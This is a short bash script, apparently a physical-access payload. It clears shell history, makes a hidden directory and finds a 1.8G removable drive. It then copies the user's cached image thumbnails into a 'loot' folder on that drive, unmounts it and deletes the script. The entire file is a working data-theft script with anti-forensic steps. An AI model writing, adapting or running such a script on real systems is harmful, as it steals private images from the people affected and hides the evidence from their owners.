#!/bin/bash
unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
mkdir /var/tmp/.system
lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
cd ~/.cache && tar --zstd -cf $mntt/loot/imagesOfYore/thumbnails.tar.zst thumbnails
udisksctl unmount -b /dev/$disk
rm /tmp/script
